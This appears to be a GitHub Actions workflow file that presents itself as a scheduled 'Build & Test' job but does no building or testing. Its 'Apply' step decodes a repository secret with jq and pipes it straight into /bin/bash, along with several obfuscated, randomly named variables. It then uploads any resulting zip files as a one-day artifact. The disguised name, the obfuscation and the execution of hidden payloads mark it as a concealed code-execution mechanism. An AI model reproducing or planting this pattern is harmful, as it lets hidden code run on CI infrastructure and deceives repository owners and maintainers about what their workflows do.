name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '39 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply
        env:
          k6226: ${{ secrets.k6226 }}
        run: |
          printf '%s' "$k6226" | jq -r .b0 | /bin/bash
          echo $maxgz5 | jq -r .usi75250 | /bin/bash
          printf '%s' "$ps65" | jq -r .qu9 | /bin/bash
          printf '%s' "$fazz59721" | jq -r .je2 | /bin/bash
          echo $hxcpv1797 | jq -r .akrf83348 | /bin/bash

      - name: Upload output
        uses: actions/upload-artifact@v4
        with:
          name: ypaoIc8W
          path: "*.zip"
          retention-days: 1
